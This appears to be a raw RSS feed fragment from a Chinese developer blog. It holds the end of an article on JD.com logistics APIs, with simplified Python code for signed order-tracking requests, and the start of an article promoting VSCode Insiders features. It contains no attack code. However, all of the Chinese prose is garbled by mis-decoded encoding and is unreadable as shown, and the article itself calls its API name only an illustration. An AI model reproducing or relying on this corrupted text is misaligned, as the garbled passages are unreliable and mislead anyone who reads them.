<li><strong>å±¥çº¦æ—¶æ•ˆæ‰¿è¯ºï¼š</strong> å•†å®¶åœ¨æ¥å…¥APIåï¼Œå…¶è®¢å•å¯çº³å…¥äº¬ä¸œé«˜æ•ˆçš„æ ‡å‡†åŒ–å±¥çº¦æµç¨‹ã€‚äº¬ä¸œç³»ç»Ÿä¼šæ ¹æ®ä»“åº“ä½ç½®ã€é…é€èƒ½åŠ›ã€æ—¶æ•ˆæ‰¿è¯ºäº§å“è§„åˆ™ï¼Œè‡ªåŠ¨ä¸ºç¬¦åˆæ¡ä»¶çš„è®¢å•æ‰“ä¸Š <strong>â€œæé€Ÿè¾¾â€</strong> æ ‡ç­¾ï¼Œå¹¶ä¼˜å…ˆå¤„ç†å’Œé…é€ã€‚</li>
<li><strong>ç²¾å‡†æ—¶æ®µé€è¾¾ï¼š</strong> <code>äº¬å‡†è¾¾API</code> æ˜¯â€œäº¬å‡†è¾¾â€æœåŠ¡çš„åŸºçŸ³ã€‚å®ƒå…è®¸ç”¨æˆ·é€‰æ‹©ç²¾ç¡®åˆ°å°æ—¶çº§çš„æ”¶è´§æ—¶æ®µã€‚å•†å®¶ç³»ç»Ÿé€šè¿‡APIå°†é¢„çº¦æ—¶æ®µä¿¡æ¯ä¼ é€’ç»™äº¬ä¸œç‰©æµç³»ç»Ÿï¼Œåè€…ä¼šè¿›è¡Œä¸¥æ ¼çš„ <strong>è¿åŠ›æ’ç­å’Œè·¯å¾„ä¼˜åŒ–</strong>ï¼Œç¡®ä¿åœ¨çº¦å®šæ—¶é—´å†…å®Œæˆé…é€ï¼Œå…‘ç°â€œè¯´åˆ°æ—¶é—´å°±åˆ°â€çš„æ‰¿è¯ºã€‚</li>
</ol>
<h3 data-id="heading-3">å››ã€ å¼€å‘è€…å¦‚ä½•æ¥å…¥ï¼Ÿå¼€å¯æé€Ÿä¹‹æ—…</h3>
<p>æ¥å…¥äº¬ä¸œAPIæ˜¯æå‡ç‰©æµé€Ÿåº¦çš„å…³é”®ä¸€æ­¥ï¼š</p>
<ol>
<li>
<p><strong>å¹³å°å…¥é©»ä¸è®¤è¯ï¼š</strong> å¼€å‘è€…éœ€åœ¨äº¬ä¸œå¼€æ”¾å¹³å°æ³¨å†Œè´¦å·ï¼Œåˆ›å»ºåº”ç”¨ï¼Œå¹¶é€šè¿‡èµ„è´¨å®¡æ ¸è·å– <code>App Key</code> å’Œ <code>App Secret</code> ç­‰å…³é”®è®¤è¯ä¿¡æ¯ã€‚</p>
</li>
<li>
<p><strong>æŠ€æœ¯å¯¹æ¥ï¼š</strong> æ ¹æ®äº¬ä¸œæä¾›çš„è¯¦ç»†APIæ–‡æ¡£ï¼Œå¼€å‘è€…éœ€åœ¨è‡ªå·±çš„è®¢å•ç®¡ç†ç³»ç»Ÿã€ä»“å‚¨ç®¡ç†ç³»ç»Ÿã€ç”µå•†å¹³å°åç«¯ç­‰ç³»ç»Ÿä¸­ï¼Œè°ƒç”¨ç›¸åº”çš„APIæ¥å£ã€‚</p>
<ul>
<li>
<p><strong>ç¤ºä¾‹æ ¸å¿ƒæ¥å£è°ƒç”¨æ€è·¯ (ä¼ªä»£ç )ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å‡è®¾ä½¿ç”¨Python requestsåº“</span>
import requests
import time
import hashlib
import json

<span class="hljs-comment"># åŸºç¡€é…ç½®</span>
<span class="hljs-attr">app_key</span> = <span class="hljs-string">"YOUR_APP_KEY"</span>
<span class="hljs-attr">app_secret</span> = <span class="hljs-string">"YOUR_APP_SECRET"</span>
<span class="hljs-attr">access_token</span> = <span class="hljs-string">"YOUR_ACCESS_TOKEN"</span> <span class="hljs-comment"># é€šè¿‡OAuthç­‰æˆæƒæµç¨‹è·å–</span>
<span class="hljs-attr">api_url</span> = <span class="hljs-string">"https://api.jd.com/routerjson"</span>

<span class="hljs-comment"># æ„é€ è¯·æ±‚å‚æ•° - ä»¥æŸ¥è¯¢è®¢å•ç‰©æµè½¨è¿¹ä¸ºä¾‹</span>
<span class="hljs-attr">method</span> = <span class="hljs-string">"jingdong.trace.dynamicQueryService"</span>
<span class="hljs-attr">timestamp</span> = str(int(time.time() * <span class="hljs-number">1000</span>)) <span class="hljs-comment"># æ¯«ç§’æ—¶é—´æˆ³</span>
<span class="hljs-attr">v</span> = <span class="hljs-string">"2.0"</span>
<span class="hljs-attr">order_id</span> = <span class="hljs-string">"1234567890"</span> <span class="hljs-comment"># äº¬ä¸œè®¢å•å·</span>

<span class="hljs-comment"># å‚æ•°ç­¾å (ç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…ç­¾åè§„åˆ™éœ€å‚è€ƒæ–‡æ¡£)</span>
<span class="hljs-attr">param_dict</span> = {
    "method": method,
    "app_key": app_key,
    "access_token": access_token,
    "timestamp": timestamp,
    "v": v,
    "order_id": order_id
}
<span class="hljs-comment"># 1. å‚æ•°æŒ‰Keyæ’åº &amp; æ‹¼æ¥</span>
<span class="hljs-attr">sorted_params</span> = sorted(param_dict.items())
<span class="hljs-attr">sign_str</span> = app_secret + <span class="hljs-string">''</span>.join([k + v for k, v in sorted_params]) + app_secret
<span class="hljs-comment"># 2. MD5 ç”Ÿæˆç­¾å</span>
<span class="hljs-attr">sign</span> = hashlib.md5(sign_str.encode(<span class="hljs-string">'utf-8'</span>)).hexdigest().upper()
param_dict<span class="hljs-section">['sign']</span> = sign

<span class="hljs-comment"># å‘é€è¯·æ±‚</span>
<span class="hljs-attr">response</span> = requests.post(api_url, data=param_dict)
<span class="hljs-attr">result</span> = response.json()

<span class="hljs-comment"># å¤„ç†å“åº” - è§£æç‰©æµè½¨è¿¹ä¿¡æ¯</span>
if result.get('code') == '0': <span class="hljs-comment"># æˆåŠŸç </span>
    <span class="hljs-attr">trace_list</span> = result[<span class="hljs-string">'jingdong_trace_dynamicQueryService_responce'</span>][<span class="hljs-string">'traceList'</span>]
    for trace in trace_list:
        print(f"æ—¶é—´: {trace<span class="hljs-section">['ope_time']</span>}, çŠ¶æ€: {trace<span class="hljs-section">['ope_remark']</span>}")
else:
    print(f"æŸ¥è¯¢å¤±è´¥: {result<span class="hljs-section">['msg']</span>}")
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ul>
</li>
<li>
<p><strong>è”è°ƒæµ‹è¯•ï¼š</strong> åœ¨æ²™ç®±ç¯å¢ƒä¸­å……åˆ†æµ‹è¯•APIè°ƒç”¨ï¼Œç¡®ä¿æ•°æ®å‡†ç¡®ã€æµç¨‹é¡ºç•…ã€‚</p>
</li>
<li>
<p><strong>ä¸Šçº¿ç›‘æ§ï¼š</strong> æ­£å¼ä¸Šçº¿åï¼ŒæŒç»­ç›‘æ§APIè°ƒç”¨çŠ¶æ€ã€å“åº”æ—¶é—´ã€æˆåŠŸç‡ç­‰æŒ‡æ ‡ï¼Œåˆ©ç”¨äº¬ä¸œæä¾›çš„ç›‘æ§å·¥å…·æˆ–è‡ªå»ºç›‘æ§ç³»ç»Ÿã€‚</p>
</li>
</ol>
<h3 data-id="heading-4">äº”ã€ æ€»ç»“ä¸å±•æœ›</h3>
<p>äº¬ä¸œAPIæ˜¯äº¬ä¸œç‰©æµå¼ºå¤§é…é€èƒ½åŠ›å‘å¤–è¾“å‡ºçš„é‡è¦æ¡¥æ¢ã€‚é€šè¿‡æ·±åº¦é›†æˆè¿™äº›APIï¼Œå•†å®¶èƒ½å¤Ÿï¼š</p>
<ul>
<li><strong>æ˜¾è‘—ç¼©çŸ­è®¢å•å¤„ç†ä¸é…é€æ—¶é—´ï¼š</strong> å‡å°‘äººå·¥ç¯èŠ‚ï¼Œè‡ªåŠ¨åŒ–æµè½¬ã€‚</li>
<li><strong>æå‡ç‰©æµé€æ˜åº¦ä¸ç”¨æˆ·ä½“éªŒï¼š</strong> å®æ—¶è½¨è¿¹ã€ç²¾å‡†é¢„çº¦ï¼Œå¢å¼ºç”¨æˆ·ä¿¡ä»»ã€‚</li>
<li><strong>ä¼˜åŒ–åº“å­˜ç®¡ç†ï¼Œé™ä½è¿è¥æˆæœ¬ï¼š</strong> æ™ºèƒ½è”åŠ¨ï¼Œå‡å°‘å†—ä½™å’Œç¼ºè´§ã€‚</li>
<li><strong>æ— ç¼æ¥å…¥äº¬ä¸œæ ¸å¿ƒæ—¶æ•ˆäº§å“ï¼š</strong> äº«å—â€œå¿«äººä¸€æ­¥â€çš„é…é€ç«äº‰åŠ›ã€‚</li>
</ul>
<p>éšç€æŠ€æœ¯çš„æŒç»­è¿­ä»£ï¼ˆå¦‚å¤§æ•°æ®ã€äººå·¥æ™ºèƒ½ã€ç‰©è”ç½‘ä¸APIçš„æ›´æ·±èåˆï¼‰ï¼Œæœªæ¥çš„äº¬ä¸œAPIå°†æ›´åŠ æ™ºèƒ½åŒ–ã€åœºæ™¯åŒ–ï¼Œä¸ºç”µå•†ç‰©æµçš„é€Ÿåº¦è¾¹ç•Œå¸¦æ¥æ›´å¤šå¯èƒ½ã€‚ç°åœ¨å°±å¼€å§‹æ‹¥æŠ±äº¬ä¸œAPIï¼Œè®©ä½ çš„è®¢å•é…é€ï¼ŒçœŸæ­£å¿«äººä¸€æ­¥ï¼</p>
<hr/>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>æ–‡ä¸­æåˆ°çš„å…·ä½“APIåç§°ï¼ˆå¦‚ <code>jingdong.trace.dynamicQueryService</code>ï¼‰ä»…ä¸ºç¤ºä¾‹ï¼Œå®é™…æ¥å£åç§°å’Œå‚æ•°è¯·ä»¥ <strong>äº¬ä¸œå®˜æ–¹å¼€æ”¾å¹³å°çš„æœ€æ–°æ–‡æ¡£</strong> ä¸ºå‡†ã€‚</li>
<li>ä»£ç ç¤ºä¾‹ä¸ºç®€åŒ–ä¼ªä»£ç ï¼ŒçœŸå®å¯¹æ¥æ¶‰åŠå¤æ‚çš„ç­¾åç®—æ³•ã€é”™è¯¯å¤„ç†ã€æ•°æ®è§£æç­‰ï¼ŒåŠ¡å¿…å‚è€ƒå®˜æ–¹SDKæˆ–æ–‡æ¡£ã€‚</li>
<li>â€œæé€Ÿè¾¾â€ã€â€œäº¬å‡†è¾¾â€ç­‰æ˜¯äº¬ä¸œç‰©æµçš„å…·ä½“æœåŠ¡äº§å“ï¼Œå…¶è¦†ç›–èŒƒå›´å’Œè§„åˆ™å¯èƒ½åŠ¨æ€è°ƒæ•´ã€‚</li>
<li>APIæ€§èƒ½ä¸ç¨³å®šæ€§ä¾èµ–äºç½‘ç»œã€ç³»ç»Ÿè´Ÿè½½ç­‰å¤šæ–¹é¢å› ç´ ã€‚</li>
</ul>
<p>Â  Â  Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fo0b.cn%2Fevan" title="https://o0b.cn/evan" target="_blank" ref="nofollow noopener noreferrer">å¦‚æœ‰ä»»ä½•ç–‘é—®ï¼Œæ¬¢è¿å¤§å®¶ç•™è¨€æ¢è®¨ã€‚</a></p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode æ¨å‡º ç»¿è‰²ç‰ˆï¼æ›´å¼ºï¼æ›´æ™ºèƒ½ï¼]]></title>    <link>https://juejin.cn/post/7580683234437267519</link>    <guid>https://juejin.cn/post/7580683234437267519</guid>    <pubDate>2025-12-08T06:40:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234437267519" data-draft-id="7580616979474137094" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode æ¨å‡º ç»¿è‰²ç‰ˆï¼æ›´å¼ºï¼æ›´æ™ºèƒ½ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Visual Studio Code"/> <meta itemprop="datePublished" content="2025-12-08T06:40:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å¼€å‘çˆ±å¥½è€…"/> <meta itemprop="url" content="https://juejin.cn/user/1116759545088190"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode æ¨å‡º ç»¿è‰²ç‰ˆï¼æ›´å¼ºï¼æ›´æ™ºèƒ½ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759545088190/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å¼€å‘çˆ±å¥½è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:40:11.000Z" title="Mon Dec 08 2025 06:40:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘ï¼Œ<strong>VSCode</strong> å†æ¬¡è¢«æ¨ä¸Šçƒ­é—¨ï¼Œå„å¤§å¼€å‘ç¤¾åŒºã€æ¨ç‰¹/X ä¸Šéƒ½åœ¨è®¨è®ºä¸€ä¸ªè¯é¢˜â€”â€” <strong>â€œVSCode ç»¿è‰²ç‰ˆï¼ˆInsidersï¼‰åŠŸèƒ½å¤ªå¼ºäº†ï¼â€</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fd75366f0ac490fb31a64d91d2db806~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=e4IwreK27oO7HkQ6ifhy0%2BJ1vvM%3D" alt="" loading="lazy"/></p>
<p>äº‹å®ä¸Šï¼Œ<strong>VSCode Insiders</strong> å¹¶ä¸æ˜¯ä¸€ä¸ªæ–°åå­—ï¼Œä½†éšç€å¾®è½¯ä¸æ–­æ³¨å…¥ <strong>AI èƒ½åŠ›ã€ç»ˆç«¯å¢å¼ºã€Git å¤§å‡çº§ã€æ–° UI</strong>ï¼Œå®ƒå·²ç»å˜æˆäº†çœŸæ­£æ„ä¹‰ä¸Šçš„ï¼š<strong>VSCode è¶…å¼ºå¢å¼ºç‰ˆï¼</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65e457d6105e4b288ac072205f72e141~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=enccncUjEEooOxgtS6UEG8794ws%3D" alt="" loading="lazy"/></p>
<p>æœ¬æ–‡å°†å¸¦ä½ å…¨é¢è®¤è¯† <strong>ç»¿è‰²ç‰ˆéƒ½å¼ºåœ¨å“ªï¼Ÿä¸ºä»€ä¹ˆå¼€å‘è€…éƒ½åœ¨æ¨èï¼Ÿä½ æ˜¯å¦åº”è¯¥å®‰è£…ï¼Ÿ</strong></p>
<h2 data-id="heading-0">ğŸ¯ <strong>ä»€ä¹ˆæ˜¯ VSCode ç»¿è‰²ç‰ˆï¼ˆInsidersï¼‰ï¼Ÿ</strong></h2>
<p><strong>ä¸€å¥è¯ï¼šVSCode çš„â€œæ›´æ–°æŠ¢å…ˆä½“éªŒç‰ˆâ€ï¼Œæ¯”æ­£å¼ç‰ˆæ›´å¿«çœ‹åˆ°æ–°åŠŸèƒ½ï¼</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd7f8a7bb5d141399075d6e6fc39658e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=gfdHagRpJjIyOStiSqoqJ09%2FM80%3D" alt="" loading="lazy"/></p>
<p>å®ƒå’Œ <strong>Stable</strong>ï¼ˆæ­£å¼ç‰ˆï¼‰å¯ä»¥å…±å­˜ä½¿ç”¨ï¼Œ<code>ä¸ä¼šè¦†ç›–</code>ã€<code>ä¸å†²çª</code>ï¼Œéå¸¸é€‚åˆçˆ±æŠ˜è…¾ã€è¿½æ–°åŠŸèƒ½çš„å¼€å‘è€…ã€‚</p>
<h2 data-id="heading-1">ğŸŸ¢ <strong>ç»ˆç«¯å¤§å‡çº§ï¼šæ™ºèƒ½æç¤ºç»ˆäºæ¥äº†ï¼</strong></h2>
<p><strong>VSCode</strong> ç»ˆç«¯ä¸€ç›´æ˜¯<code>â€œèƒ½ç”¨ä½†ä¸å¥½ç”¨â€</code>ï¼›è€Œç»¿è‰²ç‰ˆç›´æ¥æŠŠå®ƒæå‡åˆ°<code>â€œæ™ºèƒ½ç»ˆç«¯â€</code>çº§åˆ«ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68f66166dd4a4818a871e2df9faf7465~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=pJk0kbSnJ%2BRvlWoX3VXKpq2kOoM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">âœ¨ <strong>1. å‘½ä»¤è‡ªåŠ¨è¡¥å…¨ï¼ˆæ™ºèƒ½å»ºè®®ï¼‰</strong></h3>
<p>ä¾‹å¦‚ä½ åœ¨<strong>ç»ˆç«¯</strong>è¾“å…¥ï¼š</p>
<pre><code class="hljs">git ch
</code></pre>
<p>å®ƒä¼šè‡ªåŠ¨å»ºè®®ï¼š</p>
<pre><code class="hljs">git checkout
</code></pre>
<p>æ›´å‰å®³çš„æ˜¯ï¼š</p>
<ul>
<li><strong>å‘½ä»¤ flag ä¼šè¢«åˆ†ç±»å±•ç¤º</strong></li>
<li><strong>å‚æ•°æ™ºèƒ½æç¤º</strong></li>
<li><strong>è·¯å¾„è¡¥å…¨æ›´ç²¾ç¡®</strong></li>
</ul>
<h3 data-id="heading-3">âœ¨ <strong>2. AI æ‰§è¡Œå‘½ä»¤æ—¶ä½¿ç”¨â€œçœŸç»ˆç«¯æ¸²æŸ“å™¨â€</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4170726936fe4f78a6b8aec8588c3dd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=0pLSwRb8%2F4Vnk9cnBbB8qZ7ZSmk%3D" alt="" loading="lazy"/></p>
<p>ç»¿è‰²ç‰ˆå·²å°† <strong>Copilot Agent</strong> çš„ç»ˆç«¯è¾“å‡ºå‡çº§ä¸º <strong>xterm.js çœŸç»ˆç«¯æ¸²æŸ“å™¨</strong>ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f965e6dd918544c6ab49550005d0ee90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=njvLyv8RJq%2BiW4Rh8yRpYYcNol0%3D" alt="" loading="lazy"/></p>
<ul>
<li><code>ANSI</code> é¢œè‰²æ­£å¸¸æ˜¾ç¤º</li>
<li><code>è¡¨æ ¼</code>ã€<code>è¡Œåˆ—</code>å¯¹é½å‡†ç¡®</li>
<li>è¾“å‡º<code>æ¸…æ™°</code>ã€<code>ç»“æ„åŒ–</code></li>
</ul>
<p><strong>ç»ˆç«¯ä»æ­¤ä¸å†åªæ˜¯â€œå‘½ä»¤çª—â€ï¼Œè€Œæ˜¯æ™ºèƒ½äº¤äº’ç¯å¢ƒã€‚</strong></p>
<h2 data-id="heading-4">ğŸŒ³ <strong>Git ç®¡ç†ä½“éªŒæå‡ï¼šStash ç»ˆäºå¯è§†åŒ–äº†ï¼</strong></h2>
<p>ä»¥å‰ <strong>VSCode</strong> å¯¹ <code>stash</code> æ”¯æŒå‡ ä¹æ²¡æœ‰ï¼Œåªèƒ½æ•²å‘½ä»¤ã€‚</p>
<p>è¿™æ¬¡ç»¿è‰²ç‰ˆç›´æ¥è¡¥ä¸ŠçŸ­æ¿ï¼</p>
<p>è®¾ç½®ä»¥ä¸‹é€‰é¡¹ï¼š</p>
<ul>
<li><code>scm.repositories.explorerï¼štrue</code></li>
<li><code>scm.repositories.selectionModeï¼šsingle</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f92237ca2a402da1743154c0365fb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=AxqICOg7m38wJORh6RqBi4NI%2Bgc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">âœ¨ <strong>å¯è§†åŒ– Stash ç®¡ç†å™¨</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0e462d705f942f3ac4ef35e4e84ae22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=zWOw7mdOxnUKXlVNBgOVgZhpKyo%3D" alt="" loading="lazy"/></p>
<ul>
<li>æŸ¥çœ‹æ‰€æœ‰ <code>stash</code></li>
<li>ä¸€é”® <code>apply / pop / delete</code></li>
<li>è‡ªåŠ¨æ˜¾ç¤º<code>æ—¶é—´æˆ³</code></li>
<li>ç›¸åŒæ—¶é—´æ®µç”¨ç«–çº¿å¯¹é½ï¼Œç•Œé¢æ›´æ¸…çˆ½</li>
</ul>
<p>è¿™åŠŸèƒ½å¯¹äºé¢‘ç¹<code>åˆ‡åˆ†æ”¯</code>ã€<code>ä¿å­˜ä¸´æ—¶æ”¹åŠ¨</code>çš„å¼€å‘è€…æ¥è¯´ç®€ç›´æ˜¯ <strong>è´¨çš„æå‡</strong>ã€‚</p>
<h2 data-id="heading-6">ğŸ¤– <strong>AI å…¨é¢è¿›åŒ–ï¼šCopilot Agent æ¨¡å¼ä¸Šçº¿ï¼</strong></h2>
<p>è¿™æ˜¯ç»¿è‰²ç‰ˆæœ€è½°åŠ¨çš„æ›´æ–°ä¹‹ä¸€ã€‚</p>
<h3 data-id="heading-7">âœ¨ <strong>1. Copilot ä»â€œæ™ºèƒ½è¡¥å…¨â€ â†’ â€œè‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ä»£ç†â€</strong></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dad068975d62481f9aec4411410c4fcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5Y-R54ix5aW96ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780810&amp;x-signature=f0GOFN7uqwY5WFpsfDS%2FxD727B8%3D" alt="" loading="lazy"/></p>
<p>å®ƒå¯ä»¥è‡ªåŠ¨ï¼š</p>
<ul>
<li><strong>ä¿®æ”¹å¤šä¸ªæ–‡ä»¶</strong></li>
